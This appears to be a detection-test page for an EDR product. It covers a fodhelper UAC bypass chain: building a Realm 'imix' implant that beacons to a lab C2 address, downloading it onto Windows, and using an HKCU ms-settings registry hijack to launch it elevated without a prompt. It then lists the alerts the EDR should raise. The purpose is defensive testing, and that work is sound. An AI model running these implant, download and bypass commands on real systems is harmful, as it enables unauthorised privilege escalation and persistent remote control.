# Test: Evasion → elevation — fodhelper UAC bypass then elevated launch (T1548.002)

**Chain:** from a **non-elevated** shell, write an HKCU proxy for the `ms-settings`
protocol, launch the signed auto-elevate `fodhelper.exe`, and your command runs elevated
with no UAC prompt — the prelude to service installs and SYSTEM persistence from a
medium-integrity foothold.

**Implant setup — creation to the Windows machine (do once before the test):**

**a) Kali, one-time tooling** (skip if already installed):
```bash
curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh -s -- -y && source ~/.cargo/env
rustup target add x86_64-pc-windows-gnu
sudo apt update && sudo apt install -y golang git
```

**b) Kali — clone Realm, build the implant (callback baked in), start the C2:**
```bash
git clone https://github.com/spellshift/realm.git ~/realm && cd ~/realm
git checkout -b latest $(git tag | tail -1)
go run ./tavern                 # terminal 1: Tavern C2 server - leave running

cd ~/realm/implants/imix        # terminal 2: build with YOUR Kali IP baked in
IMIX_CALLBACK_URI=http://172.16.69.109:8080 cargo build --release
mkdir -p ~/sideload-lab && cp target/release/imix.exe ~/sideload-lab/sysupd.exe
```

**c) Kali — serve the binaries:**
```bash
cd ~/sideload-lab && python3 -m http.server 8000
```

**d) Windows — put the implant on the machine + prep the EDR** (elevated PowerShell):
```powershell
Invoke-WebRequest http://172.16.69.109:8000/sysupd.exe -OutFile C:\Users\Public\sysupd.exe
# EDR running + fresh persistence baseline:
curl.exe -X POST http://127.0.0.1:8420/api/baseline
# console: http://127.0.0.1:8420 - alerts stream into the LIVE panel
```
These drops themselves should already fire `SIG-REALM-IMIX` / `SIG-RUST-IMPLANT`
(on-write scan) — delivery detection working before the test even starts.
Full reference: [`../_common/implant-build.md`](../_common/implant-build.md).

`C:\Users\Public\sysupd.exe`.

**Victim — run the test in a NON-elevated PowerShell** (that's the point): `.\test.ps1`

```powershell
New-Item HKCU:\Software\Classes\ms-settings\Shell\Open\command -Force
Set-ItemProperty HKCU:\...\command -Name "(default)" -Value "C:\Users\Public\sysupd.exe"
Set-ItemProperty HKCU:\...\command -Name DelegateExecute -Value ""
Start-Process C:\Windows\System32\fodhelper.exe     # elevated implant launch, no prompt
```

**Expected alerts:**

| Rule | Sev | Trigger |
|---|---|---|
| `PERS-UAC-KEY` | critical | auditor: the ms-settings proxy key — this exact write is its highest-signal catch |
| `EVT-4688-TEMP` + `PROG-IMPLANT-LAUNCH` | high/crit | the implant's elevated launch |
| `NET-BEACON` | critical | callbacks from the elevated process |

**Verified live** on this machine. Note the auditor catches the *key write* regardless of
whether you then run fodhelper — the registry artifact is the durable indicator.

**Cleanup:** `Remove-Item -Recurse HKCU:\Software\Classes\ms-settings`.
